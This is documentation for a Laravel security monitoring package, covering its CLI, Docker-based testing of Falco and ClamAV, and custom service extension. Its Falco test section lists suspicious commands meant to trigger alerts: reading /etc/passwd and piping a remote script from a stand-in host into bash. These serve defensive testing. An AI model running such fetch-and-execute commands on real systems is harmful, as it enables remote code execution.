# Perimeter Security Monitoring

This document provides information on how to use, test, and extend the monitoring capabilities of the Perimeter security package.

## Overview

Perimeter provides real-time and point-in-time security monitoring through various security services. The monitoring system is designed to be extensible, allowing you to add custom monitoring services or use the built-in ones.

## Available Monitoring Services

The package currently includes the following fully implemented monitoring services:

- **Falco**: Runtime security monitoring that detects suspicious behavior in your application at the kernel level.
- **ClamAV**: Real-time file system monitoring for malware detection with on-access scanning.

Additional services with monitoring capabilities that are not yet fully integrated with the monitoring interface:

- **Fail2ban**: Intrusion prevention monitoring that detects and prevents brute force attacks.
- **UFW**: Firewall monitoring for network access control events.

## Using the Monitoring Command

### Basic Usage

To run a point-in-time security check:

```bash
php artisan perimeter:monitor
```

This will:
1. Detect all available monitoring services
2. Query them for recent security events
3. Display a summary of findings

### Real-time Monitoring

To start real-time monitoring:

```bash
php artisan perimeter:monitor --realtime
```

By default, real-time monitoring will run for 3600 seconds (1 hour). You can specify a custom duration:

```bash
php artisan perimeter:monitor --realtime --duration=1800  # 30 minutes
```

### Monitoring a Specific Service

To monitor only a specific service:

```bash
php artisan perimeter:monitor --service=falco
```

## Testing in Docker

Testing security monitoring tools can be challenging, as they often require specific system permissions or kernel features. Docker provides a convenient way to test these services in a controlled environment.

### Setting up Docker for Testing

The package includes a `docker-compose.yml` file configured for testing security monitoring services.

1. Start the Docker environment:

```bash
docker-compose up -d
```

2. Access the container shell:

```bash
docker-compose exec app bash
```

3. Install the monitoring services:

```bash
php artisan perimeter:install-falco
# or
php artisan perimeter:install
```

### Testing Falco Monitoring

Falco is designed to detect suspicious system behaviors. To test it:

1. Start Falco monitoring:

```bash
php artisan perimeter:monitor --service=falco --realtime --duration=600
```

2. In another terminal, run some suspicious activities (in the Docker container):

```bash
# Read sensitive files (should trigger an alert)
cat /etc/passwd

# Execute suspicious commands (should trigger an alert)
curl https://example.com/suspicious.sh | bash
```

3. Observe the alerts in the monitoring output.

### Simulating Security Events

For testing purposes, you can simulate security events without actually triggering real vulnerabilities:

```bash
# Create a test file
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/eicar.txt

# Test with ClamAV
php artisan perimeter:monitor --service=clamav
```

This uses the EICAR test file, which is a harmless file that antivirus scanners detect as malicious for testing purposes.

## Extending with Custom Monitoring Services

To create your own monitoring service:

1. Implement the `SecurityMonitoringServiceInterface`:

```php
namespace App\Security;

use Prahsys\Perimeter\Contracts\SecurityMonitoringServiceInterface;
use Prahsys\Perimeter\Data\SecurityEventData;
use Prahsys\Perimeter\Services\AbstractSecurityService;

class CustomMonitoringService extends AbstractSecurityService implements SecurityMonitoringServiceInterface
{
    /**
     * Flag to track if monitoring is active
     */
    protected bool $isMonitoring = false;
    
    /**
     * Start monitoring with the service.
     *
     * @param  int|null  $duration  Duration in seconds, or null for indefinite
     */
    public function startMonitoring(?int $duration = null): bool
    {
        // Implement monitoring start logic
        $this->isMonitoring = true;
        
        // If duration is set, schedule termination
        if ($duration !== null) {
            $this->scheduleTermination($duration);
        }
        
        return true;
    }
    
    /**
     * Stop monitoring with the service.
     */
    public function stopMonitoring(): bool
    {
        // Implement monitoring stop logic
        $this->isMonitoring = false;
        return true;
    }
    
    /**
     * Get monitoring events from the service.
     *
     * @param  int  $limit  Maximum number of events to return
     * @return array<\Prahsys\Perimeter\Data\SecurityEventData>
     */
    public function getMonitoringEvents(int $limit = 10): array
    {
        // Get raw events and convert to SecurityEventData
        $rawEvents = $this->getRawEvents($limit);
        
        $events = [];
        foreach ($rawEvents as $event) {
            $events[] = $this->resultToSecurityEventData($event);
        }
        
        return $events;
    }
    
    /**
     * Check if the service is currently monitoring.
     */
    public function isMonitoring(): bool
    {
        return $this->isMonitoring;
    }
    
    /**
     * Get monitoring options.
     */
    public function getMonitoringOptions(): array
    {
        return [
            'description' => 'Custom security monitoring service',
            'capabilities' => [
                'feature_1' => true,
                'feature_2' => true,
            ],
        ];
    }
    
    /**
     * Convert raw event to SecurityEventData
     */
    public function resultToSecurityEventData(array $data): SecurityEventData
    {
        // Create a SecurityEventData object from raw event data
        return new SecurityEventData(
            timestamp: $data['timestamp'] ?? now(),
            type: $data['type'] ?? 'custom',
            severity: $data['severity'] ?? 'medium',
            description: $data['description'] ?? 'Custom security event',
            location: $data['location'] ?? null,
            user: $data['user'] ?? null,
            service: $this->getServiceName(), // Important: use service name
            scan_id: $data['scan_id'] ?? null,
            details: $data
        );
    }
}
```

2. Register your service in a service provider:

```php
$this->app->singleton('custom-monitoring', function ($app) {
    return new CustomMonitoringService([
        'enabled' => true,
        // Other configuration
    ]);
});

// Also register with the ServiceManager
$serviceManager = $app->make(\Prahsys\Perimeter\Services\ServiceManager::class);
$serviceManager->registerClass(CustomMonitoringService::class);
```

3. Add your service to the `perimeter.php` config file:

```php
'services' => [
    // Existing services...
    'custom-monitoring' => App\Security\CustomMonitoringService::class,
],

'custom-monitoring' => [
    'enabled' => env('PERIMETER_CUSTOM_MONITORING_ENABLED', true),
    // Service-specific configuration
],
```

## Debugging Monitoring Services

If you encounter issues with monitoring services:

1. Check service status:

```bash
php artisan perimeter:health
```

2. Verify logs:

```bash
tail -f storage/logs/laravel.log
```

3. Run with verbose output:

```bash
php artisan perimeter:monitor -vv
```

## Docker Configuration for Falco

Falco requires specific kernel modules and permissions to operate properly. The included Docker configuration sets up the necessary environment:

```yaml
services:
  app:
    privileged: true
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
      - /dev:/dev
      - /proc:/host/proc:ro
      - /boot:/host/boot:ro
      - /lib/modules:/lib/modules:ro
```

These settings allow Falco to monitor system calls and detect suspicious activities within the container.